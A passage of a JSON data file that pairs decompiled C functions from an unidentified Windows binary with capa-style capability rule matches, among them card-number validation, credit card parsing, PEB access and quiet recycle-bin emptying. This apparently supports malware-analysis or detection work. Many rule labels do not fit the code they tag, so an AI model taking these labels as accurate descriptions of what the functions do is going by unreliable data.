        "decompiled_code": "\nulong fcn.000355d8(ulong param_1)\n\n{\n    ulong uVar1;\n    int64_t iStackX16;\n    ulong auStackX24 [2];\n    \n    uVar1 = 0;\n    auStackX24[0] = 0;\n    iStackX16 = 0;\n    (*_fcn.00011088)(param_1, auStackX24, &iStackX16, 0, 0, 0);\n    if (iStackX16 != 0) {\n        uVar1 = (*_fcn.00011470)(*(iStackX16 + 8), 0x4e4d4944);\n    }\n    return uVar1;\n}\n",
        "token_count": 156
    },
    "0003562c": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.0003562c(ulong arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint8_t uVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uchar auStackX32 [8];\n    \n    iVar7 = 0;\n    fcn.00031564(0x7b290, auStackX32, 0);\n    iVar4 = fcn.000366d8(arg1, 1);\n    if (iVar4 != 0) {\n        iVar7 = *(iVar4 + 0x488);\n    }\n    fcn.00031598(0x7b290, auStackX32, 0);\n    if (iVar7 == 0) {\n        uVar5 = 0xc0000008;\n    }\n    else {\n        iVar4 = (**0x7b010)(*0x7b2e8, 0x10, 0);\n        if (iVar4 == 0) {\n            uVar5 = 0xc000009a;\n        }\n        else {\n            uVar3 = (**0x7b078)();\n            iVar1 = *(iVar4 + 8);\n            *(iVar4 + 0x88) = *(iVar4 + 0x88) | 1;\n            *(iVar4 + 0x78) = iVar7;\n            *(iVar4 + 0xb8) = uVar3 << 0x38;\n            if (iVar1 != 0) {\n                iVar2 = *(iVar1 + 0x20);\n                if ((*(iVar2 + 10) & 5) == 0) {\n                    iVar6 = (**0x11220)(iVar2, 0, 1, 0, 0, 0x20);\n                }\n                else {\n                    iVar6 = *(iVar2 + 0x18);\n                }\n                if ((arg3 <= *(iVar2 + 0x28)) && (iVar6 != 0)) {\n                    fcn.000619f6(iVar6, arg2, arg3);\n                    *(iVar1 + 0x18) = arg3;\n                    *(iVar1 + 0x28) = 0;\n                    *(iVar1 + 0x10) = 0;\n                    (**0x7b030)(iVar7, iVar4, 0, 0);\n                    return 0;\n                }\n            }\n            uVar5 = 0xc000009a;\n            (**0x7b018)(iVar4);\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 578
    },
    "00035b64": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint32_t fcn.00035b64(int64_t arg1, uint *arg2)\n\n{\n    int32_t iVar1;\n    int64_t *piVar2;\n    uchar auStackX32 [8];\n    \n    iVar1 = fcn.000359b0(1, arg1, 0x1010e, arg2);\n    fcn.00031564(0x7b290, auStackX32, 1);\n    piVar2 = *0x7b280;\n    if (*0x7b280 != NULL) {\n        do {\n            if (piVar2[0x91] == arg1) break;\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n        if (piVar2 != NULL) {\n            if (iVar1 == 0) {\n                *(piVar2 + 0x86) = *arg2;\n            }\n            goto code_r0x00035be9;\n        }\n    }\n    iVar1 = -0x3ffffff8;\ncode_r0x00035be9:\n    fcn.00031598(0x7b290, auStackX32, 1);\n    return iVar1;\n}\n",
        "token_count": 263
    },
    "0003d194": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.0003d194(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    ulong uVar1;\n    int16_t in_R9W;\n    ulong *puVar2;\n    uchar auStack56 [16];\n    \n    uVar1 = 0;\n    fcn.00031564(0x7b520, auStack56, 0);\n    puVar2 = *0x7b538;\n    do {\n        if (puVar2 == NULL) {\ncode_r0x0003d1f2:\n            fcn.00031598(0x7b520, auStack56, 0);\n            return uVar1;\n        }\n        if ((((*(puVar2 + 1) == arg1) && (*(puVar2 + 0xc) == arg3)) && (*(puVar2 + 2) == noname_1)) &&\n           (*(puVar2 + 0x12) == in_R9W)) {\n            uVar1 = 1;\n            goto code_r0x0003d1f2;\n        }\n        puVar2 = *puVar2;\n    } while( true );\n}\n",
        "token_count": 253
    },
    "00047604": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.00047604(int64_t arg1, int64_t arg2, ulong *arg3)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    \n    iVar1 = *(arg1 + 0x18);\n    if (iVar1 != 0) {\n        if (*(iVar1 + 5) == '\\x10') {\n            bVar3 = *(iVar1 + 8) < *0x15b80;\n            if ((*(iVar1 + 8) == *0x15b80) && (bVar3 = *(iVar1 + 0x10) < *0x15b88,  *(iVar1 + 0x10) == *0x15b88)) {\n                iVar2 = 0;\n            }\n            else {\n                iVar2 = (1 - bVar3) - (bVar3 != 0);\n            }\n            if (iVar2 == 0) {\n                iVar2 = fcn.0004609c(*(arg2 + 0x28), *(arg2 + 0x30), 1, 0);\n                if (iVar2 == 0) {\n                    *arg3 = 0x4645c;\n                    arg3[1] = *(arg2 + 0x30);\n                    return 1;\n                }\n                goto code_r0x0004767c;\n            }\n        }\n        if (*(iVar1 + 5) == '\\x11') {\n            bVar3 = *(iVar1 + 8) < *0x15bf0;\n            if (((*(iVar1 + 8) == *0x15bf0) && (bVar3 = *(iVar1 + 0x10) < *0x15bf8,  *(iVar1 + 0x10) == *0x15bf8)) &&\n               (bVar3 = *(iVar1 + 0x18) < *0x15c00,  *(iVar1 + 0x18) == *0x15c00)) {\n                iVar2 = 0;\n            }\n            else {\n                iVar2 = (1 - bVar3) - (bVar3 != 0);\n            }\n            if (iVar2 == 0) {\n                iVar2 = fcn.0004609c(*(arg2 + 0x28), *(arg2 + 0x30), 2, *(iVar1 + 0x1a));\n                if (iVar2 != 0) {\ncode_r0x0004767c:\n                    *(arg1 + 0x30) = iVar2;\n                    return 0;\n                }\n                *arg3 = 0x4645c;\n                arg3[1] = *(arg2 + 0x30);\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 607
    },
    "00049e30": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.00049e30(int64_t arg1, int64_t *arg2, int64_t *arg3)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    \n    if (arg2 == NULL) {\n        uVar2 = 0x21590066;\n    }\n    else if ((arg3 == NULL) || (*arg3 == 0)) {\n        uVar2 = 0x21590067;\n    }\n    else if (arg1 == 0) {\n        iVar3 = fcn.0002fbf0(*arg3);\n        *arg2 = iVar3;\n        uVar2 = ~-(iVar3 != 0) & 0x21590004;\n    }\n    else {\n        iVar1 = fcn.00061bdc(arg1, arg2, 0, arg3, 0x2000, 0x40);\n        if (iVar1 != 0) {\n            *arg2 = 0;\n            uVar2 = fcn.00061bdc(arg1, arg2, 0, arg3, 0x2000, 0x40);\n            if (uVar2 != 0) {\n                return uVar2;\n            }\n        }\n        uVar2 = fcn.00061bdc(arg1, arg2, 0, arg3, 0x1000, 0x40);\n    }\n    return uVar2;\n}\n",
        "token_count": 323
    },
    "0004a9b0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.0004a9b0(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    ulong uStackX8;\n    int64_t iStackX16;\n    int64_t aiStackX24 [2];\n    \n    iStackX16 = arg2;\n    aiStackX24[0] = arg3;\n    if (arg1 == 0) {\n        uStackX8 = *(arg2 + 8);\n    }\n    else {\n        uVar1 = fcn.0002fb84(arg1, arg2 + 8, &uStackX8);\n        bVar2 = uVar1 == 0;\n        if (!bVar2) goto code_r0x0004aa62;\n    }\n    uVar1 = fcn.00049dfc(arg1, aiStackX24[0], &iStackX16, 8);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        uVar1 = fcn.00049dfc(arg1, aiStackX24[0] + 8, &uStackX8, 8);\n        bVar2 = uVar1 == 0;\n        if (bVar2) {\n            uVar1 = fcn.00049dfc(arg1, uStackX8, aiStackX24, 8);\n            bVar2 = uVar1 == 0;\n            if (bVar2) {\n                uVar1 = fcn.00049dfc(arg1, iStackX16 + 8, aiStackX24, 8);\n                bVar2 = uVar1 == 0;\n            }\n        }\n    }\ncode_r0x0004aa62:\n    return uVar1 & 0xffffffffffffff00 | bVar2;\n}\n",
        "token_count": 410
    },
    "0004aac4": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.0004aac4(int64_t arg1, ulong arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    uint32_t auStackX8 [2];\n    uint32_t auStackX16 [2];\n    uint auStackX24 [4];\n    \n    auStackX24[0] = arg3;\n    auStackX16[0] = arg2;\n    if (arg1 == 0) {\n        auStackX8[0] = *(arg2 + 4);\n    }\n    else {\n        uVar1 = fcn.0002fb84(arg1, arg2 + 4, auStackX8);\n        bVar2 = uVar1 == 0;\n        if (!bVar2) goto code_r0x0004ab76;\n    }\n    uVar1 = fcn.00049dfc(arg1, arg3, auStackX16, 4);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        uVar1 = fcn.00049dfc(arg1, arg3 + 4, auStackX8, 4);\n        bVar2 = uVar1 == 0;\n        if (bVar2) {\n            uVar1 = fcn.00049dfc(arg1, auStackX8[0], auStackX24, 4);\n            bVar2 = uVar1 == 0;\n            if (bVar2) {\n                uVar1 = fcn.00049dfc(arg1, auStackX16[0] + 4, auStackX24, 4);\n                bVar2 = uVar1 == 0;\n            }\n        }\n    }\ncode_r0x0004ab76:\n    return uVar1 & 0xffffffffffffff00 | bVar2;\n}\n",
        "token_count": 409
    },
    "0004af30": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint fcn.0004af30(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    int64_t arg2_00;\n    int64_t iVar2;\n    \n    arg2_00 = fcn.0002fbc4(0x20a);\n    if (arg2_00 == 0) {\n        uVar1 = 0x21590004;\n    }\n    else {\n        iVar2 = fcn.00061be8(arg2_00, arg2, 0x104);\n        if (iVar2 == -1) {\n            uVar1 = 0x21590066;\n        }\n        else {\n            *(arg2_00 + iVar2 * 2) = 0;\n            uVar1 = fcn.0004a418(arg1, arg2_00, arg3, arg4);\n        }\n        fcn.0002fc50(arg2_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 217
    },
    "0004c2f0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.0004c2f0(uint64_t arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    ulong uStackX16;\n    ulong uStackX24;\n    uchar auStackX32 [8];\n    \n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        uVar1 = fcn.0004b5a8(arg1, arg2, auStackX32);\n        if (uVar1 == 0) {\n            uVar1 = fcn.00049f40(&uStackX16, 0x18, arg1 & 0xffffffff);\n            if (uVar1 == 0) {\n                uStackX24 = 0;\n                fcn.00061be2(uStackX16, auStackX32, &uStackX24, 0x8000);\n                fcn.000619de(uStackX16);\n                uVar1 = 0;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 230
    },
    "00059414": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.00059414(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t in_stack_00000028;\n    \n    iVar1 = fcn.00059390(arg1, arg2, 0);\n    if (iVar1 == 0) {\n        fcn.000591d4(arg1, arg3, arg4, in_stack_00000028);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0001b130": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.0001b130(void)\n\n{\n    int64_t arg1;\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    int64_t iVar4;\n    bool bVar5;\n    ulong auStackX8 [4];\n    \n    fcn.0005c47c(*0x79c60);\n    fcn.00052250(0x79c60);\n    fcn.0005c47c(*0x79c58);\n    fcn.00052250(0x79c58);\n    fcn.0005c47c(*0x79c50);\n    fcn.00052250(0x79c50);\n    fcn.0005c47c(*0x79c48);\n    fcn.00052250(0x79c48);\n    iVar1 = 0;\n    LOCK();\n    bVar5 = *0x79c68 == 1;\n    *0x79c68 = *0x79c68 ^ bVar5 * *0x79c68;\n    if (!bVar5 * (*0x79c68 ^ 1) != 1) {\n        while( true ) {\n            LOCK();\n            bVar5 = *0x79c70 == 0;\n            *0x79c70 = *0x79c70 ^ bVar5 * *0x79c70;\n            if (bVar5) break;\n            auStackX8[0] = 0xffffffffffffd8f0;\n            (**0x115e0)(0, 0, auStackX8);\n        }\n        fcn.0002f23c(0x79b88);\n        iVar2 = 100;\n        iVar4 = *0x799d8;\n        do {\n            arg1 = *(iVar1 + iVar4);\n            if (arg1 != 0) {\n                puVar3 = arg1 + 0x20;\n                iVar4 = 100;\n                do {\n                    fcn.0002fc50(*puVar3);\n                    puVar3 = puVar3 + 6;\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n                fcn.0002fc50(arg1);\n                iVar4 = *0x799d8;\n            }\n            iVar1 = iVar1 + 8;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        fcn.0002fc50(iVar4);\n        fcn.0002f2a4(0x79b88);\n        fcn.0002f214(0x79b88);\n        fcn.0002f23c(0x799d0);\n        fcn.00061a56(0x799e0, 0, 0x100);\n        fcn.0002f2a4(0x799d0);\n        fcn.0002f214(0x799d0);\n    }\n    return;\n}\n",
        "token_count": 654
    },
    "000312a4": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint32_t fcn.000312a4(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    \n    if (arg1 == NULL) {\n        iVar3 = -0x3fffff11;\n    }\n    else {\n        iVar1 = fcn.0002f718();\n        if (iVar1 == 0) {\n            iVar3 = -0x3fffffff;\n        }\n        else {\n            iVar2 = fcn.00061b9a();\n            iVar4 = fcn.0002fbc4(iVar2 + 8 + 0x30);\n            *arg1 = iVar4;\n            if (iVar4 == 0) {\n                iVar3 = -0x3fffff66;\n            }\n            else {\n                iVar3 = fcn.00061b34(iVar4, 1);\n                if ((iVar3 == 0) && (iVar3 = fcn.00061b94(*arg1, 1, 0, 0),  iVar3 == 0)) {\n                    if ((iVar1 != 0x1b) && (iVar1 != 0x26)) {\n                        return 0;\n                    }\n                    iVar4 = *arg1;\n                    iVar3 = fcn.00061b8e(iVar4 + 0x28, iVar2 + 0x10, 2);\n                    if (iVar3 == 0) {\n                        *(iVar4 + 0x2c) = 1;\n                        *(iVar4 + 0x30) = 0x11;\n                        *(iVar4 + 0x31) = 0;\n                        *(iVar4 + 0x32) = 0xc;\n                        *(iVar4 + 0x34) = 0;\n                        iVar3 = fcn.00061b88(iVar4 + 0x38, 0x64f18, 1);\n                        if (iVar3 == 0) {\n                            puVar5 = fcn.00061b82(iVar4 + 0x38, 0);\n                            *puVar5 = 0x1000;\n                            iVar3 = fcn.00061b7c(*arg1, 1, iVar4 + 0x28, 0);\n                            if (iVar3 == 0) {\n                                return 0;\n                            }\n                        }\n                    }\n                }\n                fcn.0002fc50(*arg1);\n                *arg1 = 0;\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 565
    },
    "00035288": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00035288(uint64_t arg1, int32_t *arg2, int64_t arg3, uint64_t arg4)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    unkbyte6 Var7;\n    int32_t *arg2_00;\n    int32_t *piVar8;\n    uint64_t arg1_00;\n    uint32_t *puVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    int64_t iStack104;\n    int32_t aiStack96 [2];\n    int32_t iStack88;\n    ushort uStack84;\n    ushort uStack82;\n    ushort uStack80;\n    ushort uStack78;\n    ushort uStack76;\n    \n    if (arg1 < 0x65) {\n        arg1_00 = arg1 & 0xffffffff;\n        Var7 = arg1 >> 0x10;\n        uVar10 = 0;\n        arg2_00 = arg2;\n        iVar4 = fcn.0002fd20();\n        if ((*(arg2 + 3) == iVar4) && (0x1b < (arg4 & 0xffffffff))) {\n            fcn.00035160(arg1_00, arg2, arg3);\n        }\n        else if ((*0x888a8 == '\\0') && (iVar4 = fcn.0002fd20(CONCAT62(Var7, 0x800)),  *(arg2 + 3) == iVar4)) {\n            uVar3 = (**0x113d0)(0x888a0);\n            piVar8 = 0x87cc8;\n            puVar9 = 0x87cb0;\n            iStack104 = 0x40;\n            do {\n                if (piVar8[-4] == arg1_00) {\n                    if ((*(arg3 + 0xc) == piVar8[-10]) && (*(arg3 + 0x10) == piVar8[-7])) {\n                        uVar2 = *(arg2 + 6);\n                        arg2_00 = uVar2;\n                        bVar11 = uVar2 < puVar9[-3];\n                        if (uVar2 == puVar9[-3]) {\n                            uVar1 = *(arg2 + 10);\n                            arg2_00 = uVar2 & 0xffff0000 | uVar1;\n                            bVar11 = uVar1 < *(puVar9 + -2);\n                            if (uVar1 != *(puVar9 + -2)) goto code_r0x00035356;\n                            iVar5 = 0;\n                        }\n                        else {\ncode_r0x00035356:\n                            iVar5 = (1 - bVar11) - (bVar11 != 0);\n                        }\n                        if (iVar5 != 0) goto code_r0x00035387;\n                        *piVar8 = *piVar8 + 1;\n                        iStack88 = piVar8[-6];\n                        uStack84 = *(piVar8 + -5);\n                    }\n                    else {\ncode_r0x00035387:\n                        if ((*(arg3 + 0xc) != piVar8[-7]) || (*(arg3 + 0x10) != piVar8[-10])) goto code_r0x0003545c;\n                        uVar2 = *(arg2 + 6);\n                        arg2_00 = uVar2;\n                        bVar11 = uVar2 < *puVar9;\n                        if (uVar2 == *puVar9) {\n                            uVar1 = *(arg2 + 10);\n                            arg2_00 = uVar2 & 0xffff0000 | uVar1;\n                            bVar11 = uVar1 < *(puVar9 + 1);\n                            if (uVar1 != *(puVar9 + 1)) goto code_r0x000353b4;\n                            iVar5 = 0;\n                        }\n                        else {\ncode_r0x000353b4:\n                            iVar5 = (1 - bVar11) - (bVar11 != 0);\n                        }\n                        if (iVar5 != 0) goto code_r0x0003545c;\n                        piVar8[1] = piVar8[1] + 1;\n                        iStack88 = piVar8[-9];\n                        uStack84 = *(piVar8 + -8);\n                    }\n                    uStack78 = 0;\n                    uStack80 = 0;\n                    uStack82 = 0;\n                    uStack76 = *(arg2 + 3);\n                    fcn.00031564(0x7b290, aiStack96, 0);\n                    iVar6 = fcn.00036bf8(arg1_00, 1);\n                    if (iVar6 != 0) {\n                        uVar10 = *(iVar6 + 8);\n                        uStack82 = *(iVar6 + 0x14);\n                        uStack80 = *(iVar6 + 0x14) >> 0x10;\n                        uStack78 = *(iVar6 + 0x18);\n                    }\n                    arg2_00 = aiStack96;\n                    fcn.00031598(0x7b290, arg2_00, 0);\n                    if (uVar10 != 0) {\n                        arg2_00 = &iStack88;\n                        fcn.00034f14(uVar10, arg2_00, arg3, arg4 & 0xffffffff);\n                    }\n                }\ncode_r0x0003545c:\n                puVar9 = puVar9 + 0xc;\n                piVar8 = piVar8 + 0xc;\n                iStack104 = iStack104 + -1;\n            } while (iStack104 != 0);\n            (**0x113c0)(0x888a0, arg2_00 & 0xffffffffffffff00 | uVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 1304
    },
    "0002f058": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t fcn.0002f058(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint64_t uVar9;\n    uint8_t uStackX24;\n    uint8_t uStackX25;\n    uint8_t uStackX26;\n    uint8_t auStackX32 [8];\n    uint8_t auStack312 [43];\n    uchar uStack269;\n    uchar uStack265;\n    char acStack264 [13];\n    uchar uStack251;\n    char acStack247 [32];\n    char acStack215 [167];\n    \n    iVar5 = 0;\n    fcn.00061a56(auStack312);\n    iVar7 = 0x41;\n    pcVar8 = acStack247;\n    do {\n        cVar2 = iVar7;\n        iVar7 = iVar7 + 1;\n        *pcVar8 = cVar2 + -0x41;\n        pcVar8 = pcVar8 + 1;\n    } while (iVar7 < 0x5b);\n    iVar7 = 0x61;\n    pcVar8 = acStack215;\n    do {\n        cVar2 = iVar7;\n        iVar7 = iVar7 + 1;\n        *pcVar8 = cVar2 + -0x47;\n        pcVar8 = pcVar8 + 1;\n    } while (iVar7 < 0x7b);\n    iVar7 = 0x30;\n    pcVar8 = acStack264;\n    do {\n        cVar2 = iVar7;\n        iVar7 = iVar7 + 1;\n        *pcVar8 = cVar2 + '\\x04';\n        pcVar8 = pcVar8 + 1;\n    } while (iVar7 < 0x3a);\n    uStack269 = 0x3e;\n    uStack265 = 0x3f;\n    uStack251 = 0;\n    uVar3 = arg3 >> 0x1f & 3;\n    if ((arg3 + uVar3 & 3) == uVar3) {\n        if (0 < arg3) {\n            iVar4 = arg1 - auStackX32;\n            uVar9 = (arg3 - 1U >> 2) + 1;\n            do {\n                iVar6 = 0;\n                do {\n                    puVar1 = auStackX32 + iVar6;\n                    iVar6 = iVar6 + 1;\n                    *puVar1 = auStack312[puVar1[iVar4]];\n                } while (iVar6 < 4);\n                uStackX24 = auStackX32[1] >> 4 | auStackX32[0] << 2;\n                uStackX26 = auStackX32[2] << 6 | auStackX32[3];\n                uStackX25 = auStackX32[2] >> 2 | auStackX32[1] << 4;\n                if (*(arg1 + 2) == '=') {\n                    iVar7 = 1;\n                }\n                else {\n                    iVar7 = (*(arg1 + 3) != '=') + 2;\n                }\n                fcn.000619f6(iVar5 + arg2, &uStackX24);\n                iVar5 = iVar5 + iVar7;\n                arg1 = arg1 + 4;\n                iVar4 = iVar4 + 4;\n                uVar9 = uVar9 - 1;\n            } while (uVar9 != 0);\n        }\n        *(iVar5 + arg2) = 0;\n    }\n    else {\n        iVar5 = -1;\n    }\n    return iVar5;\n}\n",
        "token_count": 843
    },
    "0001f810": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nint32_t fcn.0001f810(ulong noname_0, ulong noname_1, ulong arg3)\n\n{\n    return (arg3 + 7U & 0xfffffff8) + 1;\n}\n",
        "token_count": 50
    },
    "0001f8d8": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nint32_t fcn.0001f8d8(ulong noname_0, ulong noname_1, uint8_t *arg3, ulong arg4)\n\n{\n    if (((arg4 != 0) && (*arg3 < 8)) && (*arg3 <= arg4 - 1U)) {\n        return (arg4 - *arg3) + -1;\n    }\n    return -1;\n}\n",
        "token_count": 90
    },
    "0002743c": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.0002743c(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint auStackX8 [8];\n    uchar auStack72 [4];\n    uint32_t uStack68;\n    \n    auStackX8[0] = arg1;\n    iVar1 = fcn.00021828(0xfffffffe, 7, auStackX8, auStack72);\n    if (iVar1 == 0) {\n        fcn.000219dc(0xfffffffe, 7, uStack68, 2);\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "00029f20": {
        "rules": [
            "parse credit card information/e6f146abe79f47cd84115fe8b7938431"
        ],
        "decompiled_code": "\nuint32_t fcn.00029f20(ulong arg1)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t auStackX16 [2];\n    int64_t iStackX24;\n    uchar auStackX32 [8];\n    \n    fcn.00030130(auStackX32);\n    piVar4 = fcn.00030d1c(auStackX32);\n    uVar8 = (((0x18 - piVar4[2]) * 0x3c - piVar4[1]) * 0x3c - *piVar4) * 1000;\n    iVar3 = fcn.000217f8(0xfffffffe, 6, auStackX16, &iStackX24);\n    if (iVar3 == 0) {\n        uVar7 = 0;\n        if (auStackX16[0] != 0) {\n            iVar6 = 0;\n            do {\n                uVar1 = *(iVar6 + 0x10 + iStackX24);\n                uVar5 = *(iVar6 + 0x14 + iStackX24);\n                if ((((*(iVar6 + 0x12 + iStackX24) < 0x18) && (*(iVar6 + 0x11 + iStackX24) < 0x3c)) && (uVar1 != 0)) &&\n                   (uVar5 != 0)) {\n                    if (((uVar5 >> (piVar4[3] & 0x1fU) & 1) != 0) && ((uVar1 & 1 << (piVar4[6] & 0x1f)) != 0)) {\n                        iVar3 = piVar4[2];\n                        uVar1 = *(iVar6 + 0x12 + iStackX24);\n                        uVar2 = *(iVar6 + 0x11 + iStackX24);\n                        if ((iVar3 * 0x3c + piVar4[1]) * 0x3c + *piVar4 < (uVar1 * 0x3c + uVar2) * 0x3c) {\n                            uVar5 = ((((uVar1 - iVar3) * 0x3c - piVar4[1]) + uVar2) * 0x3c - *piVar4) * 1000;\n                            if (uVar5 < uVar8) {\n                                uVar8 = uVar5;\n                            }\n                        }\n                        else if (((((iVar3 - uVar1) * 0x3c - uVar2) + piVar4[1]) * 0x3c + *piVar4) * 1000 < 0x493e1)\n                        goto code_r0x0002a05f;\n                    }\n                }\n                else if (arg1 != 0) {\ncode_r0x0002a05f:\n                    fcn.00029dfc(*(iVar6 + 0xc + iStackX24), *(iVar6 + 0x18 + iStackX24), *(iVar6 + 4 + iStackX24), \n                                 *(iVar6 + 0x30 + iStackX24));\n                    fcn.0002191c(*(iVar6 + iStackX24), *(iVar6 + 8 + iStackX24), *(iVar6 + 4 + iStackX24));\n                }\n                uVar7 = uVar7 + 1;\n                iVar6 = iVar6 + 0x40;\n            } while (uVar7 < auStackX16[0]);\n        }\n        fcn.0001a254(iStackX24);\n    }\n    return uVar8;\n}\n",
        "token_count": 856
    },
    "0004427c": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nulong fcn.0004427c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    char *pcVar6;\n    char acStack200 [48];\n    char acStack152 [128];\n    \n    iVar4 = 0;\n    do {\n        fcn.000286f8(acStack152, 0x73);\n        if (0 < iVar4) {\n            fcn.00061bca(iVar4, acStack200, 10);\n            iVar3 = 0;\n            pcVar6 = acStack152;\n            do {\n                iVar3 = iVar3 + -1;\n                pcVar5 = pcVar6;\n                if (iVar3 == 0) break;\n                pcVar5 = pcVar6 + 1;\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar5;\n            } while (cVar1 != '\\0');\n            iVar3 = 0;\n            do {\n                cVar1 = acStack200[iVar3];\n                pcVar5[iVar3 + -1] = cVar1;\n                iVar3 = iVar3 + 1;\n            } while (cVar1 != '\\0');\n        }\n        iVar3 = -1;\n        pcVar6 = acStack152;\n        do {\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        iVar2 = fcn.0005f120(iVar4 * 8 + 0x7b7b0, 0x66220, acStack152, ~iVar3, 1);\n        if (iVar2 != 0) {\n            if (-1 < iVar4) {\n                iVar3 = iVar4 * 8 + 0x7b7b0;\n                do {\n                    fcn.0005ef7c(iVar3, 0);\n                    iVar3 = iVar3 + -8;\n                    iVar4 = iVar4 + -1;\n                } while (-1 < 